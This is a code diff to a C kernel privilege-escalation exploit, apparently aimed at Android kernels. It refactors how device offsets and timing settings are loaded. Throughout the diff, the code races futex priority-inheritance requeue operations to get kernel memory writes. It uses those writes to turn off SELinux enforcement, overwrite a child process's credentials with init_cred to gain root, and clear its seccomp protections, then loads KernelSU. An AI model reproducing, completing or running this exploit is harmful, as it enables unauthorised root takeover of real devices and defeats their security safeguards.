@@ -17,11 +17,7 @@
 
 #include "target.h"
 
-const struct kernel_offsets *active_offsets = NULL;
 TargetProfile g_target_profile;
-// TODO(decoupling:S08-profile): Future: pass const TargetProfile to consumers.
-// Input: resolved immutable profile; output: no active_offsets compatibility mirror.
-// Blocked by: runtime offset/payload macros; completion in S08 removes this comment.
 
 // TODO(decoupling:S14-session): Future: pass RuntimeConfig via ExploitSession.
 // Input: const session config; output: paths without process-global aliases.
@@ -41,16 +37,17 @@ TargetProfile g_target_profile;
 #undef SLIDE_RANDOM_BOOT_ID_DATA_OFF
 #undef SLIDE_SYSCTL_BOOTID_OFF
 
-#define SELINUX_ENFORCING_OFF         active_offsets->off_selinux_enforcing
-#define INIT_CRED_OFF                 active_offsets->off_init_cred
-#define INIT_TASK_OFF                 active_offsets->off_init_task
-#define ROOT_TASK_GROUP_OFF           active_offsets->off_root_task_group
-#define SELINUX_BLOB_SIZES_OFF        active_offsets->off_selinux_blob_sizes
-#define SECURITY_HOOK_HEADS_OFF       active_offsets->off_security_hook_heads
-#define SLIDE_NFULNL_LOGGER_OFF       active_offsets->off_slide_nfulnl_logger
-#define SLIDE_LOGGERS_0_1_OFF         active_offsets->off_slide_loggers_0_1
-#define SLIDE_RANDOM_BOOT_ID_DATA_OFF active_offsets->off_slide_boot_id
-#define SLIDE_SYSCTL_BOOTID_OFF       active_offsets->off_slide_boot_id
+#define PROFILE_VALUES target_profile_values(&g_target_profile)
+#define SELINUX_ENFORCING_OFF         PROFILE_VALUES->off_selinux_enforcing
+#define INIT_CRED_OFF                 PROFILE_VALUES->off_init_cred
+#define INIT_TASK_OFF                 PROFILE_VALUES->off_init_task
+#define ROOT_TASK_GROUP_OFF           PROFILE_VALUES->off_root_task_group
+#define SELINUX_BLOB_SIZES_OFF        PROFILE_VALUES->off_selinux_blob_sizes
+#define SECURITY_HOOK_HEADS_OFF       PROFILE_VALUES->off_security_hook_heads
+#define SLIDE_NFULNL_LOGGER_OFF       PROFILE_VALUES->off_slide_nfulnl_logger
+#define SLIDE_LOGGERS_0_1_OFF         PROFILE_VALUES->off_slide_loggers_0_1
+#define SLIDE_RANDOM_BOOT_ID_DATA_OFF PROFILE_VALUES->off_slide_boot_id
+#define SLIDE_SYSCTL_BOOTID_OFF       PROFILE_VALUES->off_slide_boot_id
 
 /* Override struct field offsets (task_struct, etc.) with per-device values */
 #include "runtime_struct_offsets.h"
@@ -69,9 +66,6 @@ TargetProfile g_target_profile;
 #endif
 #include "offsets_json.h"
 
-// TODO(decoupling:S08-profile): Replace this transport storage and offset macros
-// with semantic TargetProfile accessors passed to consumers.
-static struct kernel_offsets g_external_offsets;
 static char g_external_release[192];
 
 /* Decoupling plan: validate common and chain-specific target metadata. Input:
@@ -130,6 +124,31 @@ static int validate_offsets_profile(const struct kernel_offsets *entry) {
       return -1;
     }
   }
+  const struct execution_settings *e = &entry->execution;
+  if (e->recommended_main_cpu >= CPU_SETSIZE ||
+      e->recommended_consumer_cpu >= CPU_SETSIZE ||
+      e->recommended_main_cpu == e->recommended_consumer_cpu ||
+      !e->heap_prepare_max_attempts || !e->heap_prepare_timeout_ms ||
+      !e->heap_kernelsnitch_timeout_ms || !e->race_route_wait_ms ||
+      !e->race_setup_settle_us || !e->race_state_poll_interval_us ||
+      !e->w1_attempts || !e->w1_settle_us ||
+      !e->w1_scratch_repair_attempts || !e->w2_attempts ||
+      !e->w2_settle_us || !e->w3_chain_rounds || !e->w3_attempts ||
+      !e->w3_settle_us || !e->tcp_attempts || !e->tcp_arm_sequence ||
+      e->tcp_arm_sequence > e->tcp_attempts ||
+      !e->tcp_post_receive_hold_iterations || !e->select_enter_delay_us ||
+      !e->select_timeout_us || !e->select_consumer_max_calls ||
+      !e->select_consumer_burst_calls || !e->multicast_ready_timeout_ms ||
+      !e->multicast_post_requeue_settle_us ||
+      !e->multicast_post_adjust_settle_us ||
+      !e->handoff_pre_dispatch_settle_ms ||
+      !e->handoff_module_poll_attempts ||
+      !e->handoff_module_poll_interval_ms ||
+      !e->handoff_enforce_poll_attempts ||
+      !e->handoff_enforce_poll_interval_ms) {
+    pr_error("profile execution settings are incomplete or invalid\n");
+    return -1;
+  }
   return 0;
 }
 
@@ -185,12 +204,9 @@ static void log_execution_settings(const struct kernel_offsets *profile) {
 /* Decoupling plan: publish derived addresses for the selected profile. Inputs:
  * profile and RuntimeConfig; output: ResolvedAddresses. Future:
  * resolve_runtime_addresses(), without modifying process globals. */
-static int publish_active_offsets(void) {
-  g_target_profile = target_profile_view(active_offsets);
+static int resolve_profile_addresses(void) {
   if (resolved_addresses_init(&g_resolved_addresses, &g_target_profile) != 0)
     return -1;
-  p0_kernel_phys_load = g_resolved_addresses.kernel_phys_load;
-  g_init_cred_image = g_resolved_addresses.init_cred_image;
   pr_info("soc: %s; kernel_phys_load=0x%llx\n",
           resolved_addresses_soc_name(&g_resolved_addresses, &g_target_profile),
           (unsigned long long)g_resolved_addresses.kernel_phys_load);
@@ -206,6 +222,7 @@ static int publish_active_offsets(void) {
  * target_profile_select() and resolve_runtime_addresses(). */
 static int select_offsets(const char *profile_path) {
   struct utsname uts;
+  struct kernel_offsets decoded = {0};
   if (uname(&uts) < 0) return -1;
   pr_info("kernel: %s\n", uts.release);
 #ifdef TARGET_KERNEL_RELEASE
@@ -216,7 +233,7 @@ static int select_offsets(const char *profile_path) {
   }
 #endif
   if (!profile_path ||
-      load_resolved_profile_json(profile_path, &g_external_offsets,
+      load_resolved_profile_json(profile_path, &decoded,
                                  g_external_release,
                                  sizeof(g_external_release)) != 0) {
     pr_error("cannot load resolved profile: %s\n",
@@ -228,11 +245,14 @@ static int select_offsets(const char *profile_path) {
              g_external_release);
     return -1;
   }
-  if (validate_offsets_profile(&g_external_offsets) != 0) return -1;
-  active_offsets = &g_external_offsets;
-  pr_success("resolved profile loaded: %s\n", active_offsets->uname_r);
-  log_execution_settings(active_offsets);
-  if (publish_active_offsets() != 0) {
+  if (validate_offsets_profile(&decoded) != 0) return -1;
+  g_target_profile = target_profile_snapshot(&decoded);
+  pr_success("resolved profile loaded: %s\n", PROFILE_VALUES->uname_r);
+  if (runtime_config_apply_profile(&g_runtime_config, &g_target_profile) != 0)
+    return -1;
+  runtime_config_log(&g_runtime_config);
+  log_execution_settings(PROFILE_VALUES);
+  if (resolve_profile_addresses() != 0) {
     pr_error("cannot resolve profile address space\n");
     return -1;
   }
@@ -248,10 +268,10 @@ static void timer_reset(void) { clock_gettime(CLOCK_MONOTONIC, &t0); }
 static double timer_ms(void) {
   return runtime_elapsed_ms(&t0);
 }
-#define TIMER(label) do { \
-    pr_info("[T+%.0fms] %s\n", timer_ms(), label); \
-    log_sync(); \
-  } while (0)
+static const struct execution_settings *execution_settings(void) {
+  return target_profile_execution(&g_target_profile);
+}
+#define TIMER(label) pr_info("[T+%.0fms] %s\n", timer_ms(), label)
 
 uint32_t f_wait;
 uint32_t f_pi_target;
@@ -284,7 +304,8 @@ void *waiter_thread(void *arg) {
   if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
     pr_warning("waiter lock chain errno=%d\n", errno);
   atomic_store(&waiter_ready, 1);
-  while (!atomic_load(&owner_started)) usleep(1000);
+  while (!atomic_load(&owner_started))
+    usleep(execution_settings()->race_state_poll_interval_us);
   struct timespec timeout;
   SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
   if (atomic_load(&fast_repair_route)) {
@@ -294,7 +315,14 @@ void *waiter_thread(void *arg) {
       timeout.tv_nsec -= 1000000000L;
     }
   } else {
-    timeout.tv_sec += ROUTE_WAIT_SECONDS;
+    uint64_t wait_ns =
+        (uint64_t)execution_settings()->race_route_wait_ms * 1000000ULL;
+    timeout.tv_sec += (time_t)(wait_ns / 1000000000ULL);
+    timeout.tv_nsec += (long)(wait_ns % 1000000000ULL);
+    if (timeout.tv_nsec >= 1000000000L) {
+      timeout.tv_sec++;
+      timeout.tv_nsec -= 1000000000L;
+    }
   }
   atomic_store(&waiter_waiting, 1);
   futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
@@ -317,7 +345,8 @@ void *waiter_thread(void *arg) {
   }
   atomic_store(&route_done, 1);
   futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
-  while (!atomic_load(&owner_chain_done)) usleep(1000);
+  while (!atomic_load(&owner_chain_done))
+    usleep(execution_settings()->race_state_poll_interval_us);
   return NULL;
 }
 
@@ -326,8 +355,9 @@ void *waiter_thread(void *arg) {
 void *owner_thread(void *arg __attribute__((unused))) {
   disable_rseq_for_thread();
   long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
-  if (lock_target != 0) pr_warning("owner lock target errno=%d\n", errno);
-  while (!atomic_load(&waiter_ready)) usleep(1000);
+  if (lock_target != 0) pr_error("owner lock target errno=%d\n", errno);
+  while (!atomic_load(&waiter_ready))
+    usleep(execution_settings()->race_state_poll_interval_us);
   atomic_store(&owner_started, 1);
   futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
   atomic_store(&owner_chain_done, 1);
@@ -358,7 +388,8 @@ void *consumer_thread(void *arg __attribute__((unused))) {
            atomic_load(&punch_consume_go) == seq) {
       int delay_usec = atomic_load(&main_route_delay_usec);
       if (delay_usec > 0) usleep((useconds_t)delay_usec);
-      for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
+      for (uint32_t burst = 0;
+           burst < execution_settings()->select_consumer_burst_calls; burst++) {
         if (atomic_load(&punch_consume_stop) ||
             atomic_load(&punch_consume_go) != seq) break;
         atomic_fetch_add(&consumer_calls, 1);
@@ -366,7 +397,7 @@ void *consumer_thread(void *arg __attribute__((unused))) {
         errno = 0;
         /* rotate the nice every call; (calls%19)+1 is what makes
          * sched_setattr succeed on 6.1 compact */
-        int consumer_nice = (active_offsets && active_offsets->compact_waiter)
+        int consumer_nice = target_profile_has_compact_waiter(&g_target_profile)
                                 ? (calls_this_seq % 19) + 1
                                 : PSELECT_CONSUMER_NICE;
         long sched_ret = sched_setattr_tid(tid, consumer_nice);
@@ -381,7 +412,8 @@ void *consumer_thread(void *arg __attribute__((unused))) {
         if (sched_ret == 0) atomic_fetch_add(&consumer_success, 1);
         atomic_store(&consumer_inflight, 0);
         calls_this_seq++;
-        if (calls_this_seq >= CONSUMER_MAX_CALLS) {
+        if ((uint32_t)calls_this_seq >=
+            execution_settings()->select_consumer_max_calls) {
           atomic_store(&punch_consume_go, 0);
           break;
         }
@@ -404,7 +436,7 @@ void reset_main_route_state(void) {
   atomic_store(&consumer_inflight, 0);
   atomic_store(&main_route_delay_usec,
                atomic_load(&fast_repair_route) ? 5000
-                                                : PSELECT_ENTER_DELAY_USEC);
+                   : (int)execution_settings()->select_enter_delay_us);
   route_last_step = 0; route_last_errno = 0;
 }
 
@@ -419,15 +451,18 @@ int run_main_route_threads(const WriteRequest *request) {
   SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
   SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));
   while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started))
-    usleep(1000);
+    usleep(execution_settings()->race_state_poll_interval_us);
   pr_info("[route] waiter parked; owner started\n");
-  usleep(atomic_load(&fast_repair_route) ? 5000 : 50000);
+  usleep(atomic_load(&fast_repair_route)
+             ? 5000
+             : execution_settings()->race_setup_settle_us);
   errno = 0;
   long rq = futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
                      &f_pi_target, 0);
   pr_info("[route] CMP_REQUEUE_PI ret=%ld errno=%d; waiting route_done\n",
           rq, errno);
-  while (!atomic_load(&route_done)) usleep(5000);
+  while (!atomic_load(&route_done))
+    usleep(execution_settings()->race_state_poll_interval_us);
   pr_info("[route] route_done step=%d errno=%d calls=%d success=%d\n",
           route_last_step, route_last_errno, atomic_load(&consumer_calls),
           atomic_load(&consumer_success));
@@ -462,8 +497,11 @@ static int do_one_write(const WriteRequest *request, const char *desc) {
     uintptr_t value = !request->preserve_child
         ? 0
         : (request->mode == WRITE_MODE_CREDENTIAL
-               ? data_addr(g_init_cred_image)
-               : data_addr(EMPTY_ZERO_PAGE));
+               ? resolved_addresses_data_alias(
+                     &g_resolved_addresses,
+                     g_resolved_addresses.init_cred_image)
+               : resolved_addresses_data_alias(
+                     &g_resolved_addresses, EMPTY_ZERO_PAGE));
     int ok = kernel5_resident_write(request->target, value);
     return ok;
   }
@@ -989,7 +1027,9 @@ static int retry_write_stage(
     if (attempt == 1) slab_drain();
     if (mode == 2 && kernel5_route_selected()) {
       const WriteRequest repair_request = write_request_make(
-          data_addr(g_init_cred_image) + 8, WRITE_MODE_ZERO, 1);
+          resolved_addresses_data_alias(
+              &g_resolved_addresses, g_resolved_addresses.init_cred_image) + 8,
+          WRITE_MODE_ZERO, 1);
       page_base = prepare_good_kernel_page(&repair_request);
       if (!page_base || !stash_prebuilt_page()) {
         pr_warning("W2 fast repair prebuild failed\n");
@@ -1014,7 +1054,9 @@ static int retry_write_stage(
         return 0;
       }
       const WriteRequest repair_request = write_request_make(
-          data_addr(g_init_cred_image) + 8, WRITE_MODE_ZERO, 1);
+          resolved_addresses_data_alias(
+              &g_resolved_addresses, g_resolved_addresses.init_cred_image) + 8,
+          WRITE_MODE_ZERO, 1);
       pr_info("W2b: firing prebuilt init_cred+8 repair\n");
       atomic_store(&fast_repair_route, 1);
       int repaired = run_main_route_threads(&repair_request);
@@ -1150,10 +1192,10 @@ int run_exploit(int argc, char **argv) {
     pr_error("runtime configuration failed errno=%d\n", errno);
     return 1;
   }
-  runtime_config_log(&g_runtime_config);
   write_root_script();
 
-  if (!active_offsets && select_offsets(profile_path) < 0) return 1;
+  if (!target_profile_is_loaded(&g_target_profile) &&
+      select_offsets(profile_path) < 0) return 1;
 
   apply_iomem_cache();
   log_startup_context();
@@ -1184,10 +1226,15 @@ int run_exploit(int argc, char **argv) {
       pr_warning("SELinux enforce unreadable; assuming enforcing and running W1\n");
     }
     TIMER("pre-W1 drain");
-    int w1_attempts = (kernel5_route_selected() &&
-                       !g_runtime_config.multicast_resident_enabled) ? 1 : 15;
+    int w1_attempts = (int)execution_settings()->w1_attempts;
+    if (kernel5_route_selected() &&
+        !g_runtime_config.multicast_resident_enabled)
+      w1_attempts = 1; /* one-shot route cannot safely retry a missed W1 */
     selinux_ok = retry_write_stage(
-        "W1: SELinux", data_addr(SELINUX_ENFORCING), 1, w1_attempts, 100000,
+        "W1: SELinux",
+        resolved_addresses_data_alias(&g_resolved_addresses, SELINUX_ENFORCING),
+        1, w1_attempts,
+        execution_settings()->w1_settle_us,
         verify_selinux_stage, NULL, 0);
     if (!selinux_ok) {
       pr_warning("Write 1 failed\n");
@@ -1197,14 +1244,17 @@ int run_exploit(int argc, char **argv) {
     if (kernel5_route_selected() &&
         !g_runtime_config.multicast_resident_enabled) {
       uintptr_t w1_scratch_poison =
-          page_base + active_offsets->mcast_buffer_size;
+          page_base + PROFILE_VALUES->mcast_buffer_size;
       if (!quarantine_reclaim_sockets()) {
         pr_warning("W1 scratch page quarantine failed\n");
         return 1;
       }
       int repaired = 0;
-      for (int repair_try = 1; repair_try <= 3; repair_try++) {
-        pr_info("W1b: private scratch repair attempt %d/3\n", repair_try);
+      int repair_attempts =
+          (int)execution_settings()->w1_scratch_repair_attempts;
+      for (int repair_try = 1; repair_try <= repair_attempts; repair_try++) {
+        pr_info("W1b: private scratch repair attempt %d/%d\n",
+                repair_try, repair_attempts);
         const WriteRequest scratch_repair = write_request_make(
             w1_scratch_poison, WRITE_MODE_ZERO, 1);
         if (do_one_write(&scratch_repair, "W1b: private scratch repair")) {
@@ -1224,10 +1274,15 @@ int run_exploit(int argc, char **argv) {
     if (kernel5_route_selected() &&
         g_runtime_config.multicast_resident_enabled) {
       uintptr_t repair =
-          (data_addr(KIMAGE_TEXT_BASE + active_offsets->off_mcast_fake_bss) +
-           active_offsets->mcast_fake_lock_offset)
+          (resolved_addresses_data_alias(
+               &g_resolved_addresses,
+               KIMAGE_TEXT_BASE + PROFILE_VALUES->off_mcast_fake_bss) +
+           PROFILE_VALUES->mcast_fake_lock_offset)
                          & ~(uintptr_t)0x1fffff;
-      if (!kernel5_resident_write(data_addr(SELINUX_ENFORCING) + 4, repair)) {
+      if (!kernel5_resident_write(
+              resolved_addresses_data_alias(
+                  &g_resolved_addresses, SELINUX_ENFORCING) + 4,
+              repair)) {
         pr_warning("W1 policycap repair failed\n");
         kernel5_resident_stop();
         return 1;
@@ -1258,9 +1313,11 @@ int run_exploit(int argc, char **argv) {
 
   /* W2+W3 as a retryable chain: a missed W3 write or probe can kill the
    * child, so respawn and redo. */
-  for (int round = 1; round <= 3; round++) {
+  int chain_rounds = (int)execution_settings()->w3_chain_rounds;
+  for (int round = 1; round <= chain_rounds; round++) {
     if (round > 1) {
-      pr_warning("W3 chain retry %d/3: parking rooted child\n", round);
+      pr_warning("W3 chain retry %d/%d: parking rooted child\n",
+                 round, chain_rounds);
       if (child > 0 && child_alive) {
         write(pipes.cmd_w, "P", 1);
         usleep(50000);
@@ -1352,12 +1409,15 @@ int run_exploit(int argc, char **argv) {
 #endif
 
     int got_root = retry_write_stage(
-        "W2: cred", child_task + TASK_CRED_OFF, 2, 15, 100000,
+        "W2: cred", child_task + TASK_CRED_OFF, 2,
+        (int)execution_settings()->w2_attempts,
+        execution_settings()->w2_settle_us,
         verify_w2_stage, &w2_context, 0);
     if (!got_root) {
       write(pipes.cmd_w, "X", 1);
       close(pipes.cmd_w); close(pipes.uid_r);
-      pr_warning("W2 failed after 15 rounds\n");
+      pr_warning("W2 failed after %u rounds\n",
+                 execution_settings()->w2_attempts);
       waitpid(child, NULL, WNOHANG);
       return 1;
     }
@@ -1406,8 +1466,9 @@ int run_exploit(int argc, char **argv) {
       ? child_task + TASK_SECCOMP_OFF - 8
       : child_task + TASK_SECCOMP_OFF;
 
-    for (int attempt = 1; attempt <= 6; attempt++) {
-      pr_info("W3: TIF_SECCOMP+mode attempt %d/6\n", attempt);
+    int w3_attempts = (int)execution_settings()->w3_attempts;
+    for (int attempt = 1; attempt <= w3_attempts; attempt++) {
+      pr_info("W3: TIF_SECCOMP+mode attempt %d/%d\n", attempt, w3_attempts);
       if (attempt == 1) slab_drain();
       const WriteRequest flags_request =
           write_request_make(flags_target, WRITE_MODE_ZERO, 1);
@@ -1417,7 +1478,7 @@ int run_exploit(int argc, char **argv) {
         usleep(100000);
         continue;
       }
-      usleep(50000);
+      usleep(execution_settings()->w3_settle_us);
       const WriteRequest mode_request =
           write_request_make(mode_target, WRITE_MODE_ZERO, 1);
       routed = do_one_write(&mode_request, "W3: seccomp mode");
@@ -1426,7 +1487,7 @@ int run_exploit(int argc, char **argv) {
         usleep(100000);
         continue;
       }
-      usleep(50000);
+      usleep(execution_settings()->w3_settle_us);
       int st = 0;
       if (waitpid(child, &st, WNOHANG) == child) {
         pr_warning("W3 lost the child (status=0x%x); chain will retry\n", st);
@@ -1437,7 +1498,7 @@ int run_exploit(int argc, char **argv) {
         seccomp_ok = 1;
         break;
       }
-      usleep(50000);
+      usleep(execution_settings()->w3_settle_us);
     }
 
     if (!seccomp_ok) {
@@ -1449,13 +1510,14 @@ int run_exploit(int argc, char **argv) {
   }
 
   if (!seccomp_ok)
-    pr_warning("W3 seccomp bypass failed after 3 chain rounds; ksud late-load will likely stay blocked\n");
+    pr_warning("W3 seccomp bypass failed after %d chain rounds; ksud late-load will likely stay blocked\n",
+               chain_rounds);
 
   /* Let the repaired credential and reclaimed waiter state settle before the
    * rooted child reloads SELinux policy and late-loads KernelSU.  Dispatching
    * immediately regressed the proven 5.15 path: KernelSU loaded, then init
    * exited during policy recovery and the device panicked. */
-  sleep(2);
+  usleep(execution_settings()->handoff_pre_dispatch_settle_ms * 1000U);
   TIMER("exploit complete");
   if (!ever_rooted) {
     pr_error("w2 never rooted a child\n");
@@ -1479,8 +1541,10 @@ int run_exploit(int argc, char **argv) {
   close(pipes.uid_r);
 
   int kernelsu_ready = 0;
-  for (int i = 0; i < 30 && !(kernelsu_ready = kernelsu_module_loaded()); i++) {
-    usleep(100000);
+  for (uint32_t i = 0;
+       i < execution_settings()->handoff_module_poll_attempts &&
+       !(kernelsu_ready = kernelsu_module_loaded()); i++) {
+    usleep(execution_settings()->handoff_module_poll_interval_ms * 1000U);
   }
   /* untrusted_app loses /proc/modules once enforcing is restored, so poll
    * the app-readable log for the loaded-module line (up to ~30s). */
@@ -1500,6 +1564,28 @@ int run_exploit(int argc, char **argv) {
     }
     if (!ksu_log_failed && !ksu_log_loaded) usleep(500000);
   }
+  /* Module init re-enforces at the very end of kernelsu_init; wait up to
+   * 20s for it. Denied read or value 1 both mean enforcing here. */
+  int enforce_ok = 0;
+  for (uint32_t i = 0;
+       ksu_log_loaded && !enforce_ok &&
+       i < execution_settings()->handoff_enforce_poll_attempts; i++) {
+    int efd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
+    if (efd < 0) {
+      enforce_ok = 1;
+      break;
+    }
+    char eb[4] = {0};
+    ssize_t rn = read(efd, eb, sizeof(eb));
+    close(efd);
+    if (rn > 0 && eb[0] == '1') enforce_ok = 1;
+    if (!enforce_ok)
+      usleep(execution_settings()->handoff_enforce_poll_interval_ms * 1000U);
+  }
+  if (enforce_ok)
+    pr_info("enforce=1 (enforcing)\n");
+  else if (ksu_log_loaded)
+    pr_warning("enforce=0 (still permissive)\n");
   kernelsu_ready = kernelsu_ready || ksu_log_loaded;
   /* enforcing takes the app dir away from the root script, so its log stops
    * before the restore. the state has to be read from here. */
